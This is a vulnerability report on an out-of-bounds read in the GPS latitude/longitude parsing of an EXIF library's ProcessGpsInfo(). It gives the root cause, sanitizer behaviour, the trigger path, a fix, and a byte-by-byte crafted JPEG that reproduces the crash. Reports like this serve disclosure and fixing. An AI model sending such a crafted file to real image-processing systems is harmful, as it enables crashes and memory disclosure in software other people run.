# VULN-001: GPS Lat/Long OOB Read via Under-counted Components

**Status:** VERIFIED_CRASH (UBSAN: left shift of negative value)
**CWE:** CWE-125 Out-of-bounds Read
**Function:** `ProcessGpsInfo()` in `gpsinfo.c`

---

## Root Cause

`ProcessGpsInfo()` validates that RATIONAL GPS tag data fits within the EXIF
segment using the declared `Components` count:

```c
// gpsinfo.c ~line 104-116
ComponentSize = BytesPerFormat[Format];        // 8 for FMT_URATIONAL
ByteCount     = Components * ComponentSize;    // 1 * 8 = 8  (uses declared count)

if (OffsetVal + ByteCount > ExifLength ...){   // 40+8=48 <= 48  → PASSES
    ErrNonfatal(...); continue;
}
ValuePtr = OffsetBase + OffsetVal;             // points to 8 valid bytes
```

But the subsequent loop for `TAG_GPS_LAT` / `TAG_GPS_LONG` **hardcodes 3
iterations**, ignoring `Components`:

```c
// gpsinfo.c ~line 141
for (a = 0; a < 3; a++){                       // always 3, never checks Components
    den    = Get32s(ValuePtr + 4 + a*ComponentSize);   // a=1,2: OOB reads
    Values[a] = ConvertAnyFormat(ValuePtr + a*ComponentSize, Format);
}
```

With `Components=1`, only 8 bytes are validated but 24 bytes are read
(3 × 8). Iterations `a=1` and `a=2` read 8–15 and 16–23 bytes past the
declared data boundary.

---

## Why ASAN Does Not Fire (heap-buffer-overflow)

`jpgfile.c` allocates the JPEG section buffer with 20 extra bytes:

```c
Data = (uchar *)malloc(itemlen + 20);   // +20 bytes beyond section end
```

The OOB reads land at most 15 bytes past `ExifLength` (when `OffsetVal` is
maximised as `ExifLength - 8`), which is within the extra 20-byte allocation
padding. ASAN's redzone starts only after `Data[itemlen+19]`.

---

## Why UBSAN Does Fire (left shift of negative value)

The OOB reads reach uninitialized heap memory in the extra 20-byte region.
`Get32s()` (little-endian path, `exif.c:344`) uses:

```c
return ((char *)Long)[3] << 24 | ...;   // signed char left-shifted by 24
```

The uninitialized byte at `Long[3]` happened to be `0xBE` (-66 as `char`).
Shifting a negative `char` left by 24 bits is **undefined behaviour** (C11
§6.5.7¶4). UBSAN `-fsanitize=shift-base` (part of `-fsanitize=undefined`)
correctly reports:

```
exif.c:344:37: runtime error: left shift of negative value -66
```

---

## Crafted JPEG Structure

```
FF D8               SOI
FF E1  00 38        APP1, length=56
45 78 69 66 00 00   "Exif\0\0"
49 49 2A 00         TIFF header (little-endian)
08 00 00 00         IFD0 at offset 8

[IFD0 @ ExifSection+8]
01 00               1 entry
25 88  04 00  01 00 00 00  1A 00 00 00   TAG_GPSINFO=0x8825, LONG, count=1, GPS_IFD_offset=26
00 00 00 00         next IFD = 0

[GPS IFD @ ExifSection+26]
01 00               1 entry
02 00  05 00  01 00 00 00  28 00 00 00   TAG_GPS_LAT=0x0002, URATIONAL, count=1[BUG!], data_offset=40
                                         ^^^^^^^^ should be 3 for a valid GPS latitude

[GPS lat data @ ExifSection+40, 8 bytes — only 1 component]
3C 00 00 00  01 00 00 00   numerator=60, denominator=1

[OOB reads: ExifSection[48..63] — uninitialized heap bytes from malloc(56+20)]
```

---

## Trigger Path

```
main()
  → ProcessFile()
    → ReadImgFile()
      → ReadJpegFile()
        → ReadJpegSections()
          [M_EXIF / APP1 processed here]
          → process_EXIF(Data+8, itemlen-8)
            → ProcessExifDir(ExifSection+8, ExifSection, ExifLength=48, 0)
              [TAG_GPSINFO=0x8825 found, GPS_IFD_offset=26]
              → ProcessGpsInfo(ExifSection+26, ExifSection, 48)
                [TAG_GPS_LAT found, Components=1 — boundary check passes]
                → loop a=0,1,2  ← a=1,2 OOB; Get32s reads negative byte → UBSAN
```

---

## Fix

Change the hardcoded `3` in the loop bound to use `Components`:

```c
// Proposed fix (gpsinfo.c ~line 141)
unsigned loop_count = (Components >= 3) ? 3 : Components;
for (a = 0; a < loop_count; a++){
```

Or alternatively validate that `Components == 3` before entering the loop
and skip/warn if not.
